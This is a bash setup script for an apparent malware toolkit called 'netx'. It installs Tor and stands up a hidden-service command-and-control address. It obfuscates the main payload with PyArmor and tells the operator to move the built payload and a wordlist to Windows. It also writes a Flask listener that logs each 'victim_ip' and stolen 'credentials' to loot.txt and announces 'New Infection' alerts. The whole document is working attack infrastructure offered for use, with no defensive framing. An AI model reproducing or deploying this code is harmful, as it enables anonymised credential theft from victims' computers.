# 1. Enter the repository
cd netx || { echo "Error: Run this from the directory containing netx"; exit 1; }

# 2. Install Dependencies (Homebrew & Tor)
if ! command -v brew &> /dev/null; then
    echo "[*] Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
fi

if ! command -v tor &> /dev/null; then
    echo "[*] Installing Tor..."
    brew install tor
fi

# 3. Setup Python Virtual Environment & Requirements
echo "[*] Setting up Python environment..."
python3 -m venv venv
source venv/bin/activate
pip install pyarmor pyinstaller paramiko requests pysocks Flask psutil nmap netifaces stem

# 4. Configure Tor Hidden Service
mkdir -p keys
cat <<EOF > torrc_config
HiddenServiceDir $(pwd)/keys
HiddenServicePort 80 127.0.0.1:5000
EOF

# 5. Launch Tor in Background
echo "[*] Launching Tor tunnel..."
tor -f torrc_config > /dev/null 2>&1 &
TOR_PID=$!

# 6. Wait for .onion Address
echo "[*] Waiting for .onion address generation..."
while [ ! -f "keys/hostname" ]; do
    sleep 2
done
ONION_ADDR=$(cat keys/hostname)

# 7. Obfuscate main.py
if [ -f "main.py" ]; then
    echo "[*] Obfuscating main.py with PyArmor..."
    pyarmor gen main.py
else
    echo "Error: main.py not found!"
    kill $TOR_PID
    exit 1
fi

# 8. Success Output
echo -e "\n\033[1;32m====================================================="
echo -e "       NETX DEPLOYMENT READY (MAC SIDE)"
echo -e "=====================================================\033[0m"
echo -e "\033[1;33mYOUR C2 ADDRESS: http://$ONION_ADDR\033[0m"
echo -e "\033[1;32m=====================================================\033[0m"
echo -e "1. OPEN A NEW TAB and run: 'source venv/bin/activate && python3 listener.py'"
echo -e "2. MOVE the 'dist' folder and 'wordlist.txt' to Windows."
echo -e "3. Tor is running in background (PID: $TOR_PID)."
echo -e "=====================================================\n"

# Create the listener script automatically
cat <<EOF > listener.py
from flask import Flask, request
from datetime import datetime
app = Flask(__name__)
@app.route('/report', methods=['POST'])
def receive():
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.form.get('victim_ip', 'Unknown')
    creds = request.form.get('credentials', 'Unknown')
    with open("loot.txt", "a") as f:
        f.write(f"{ts} | {ip} | {creds}\n")
    print(f"\033[1;31m[*] ALERT: New Infection from {ip} | Creds: {creds}\033[0m")
    return "OK", 200
if __name__ == '__main__':
    app.run(port=5000)
EOF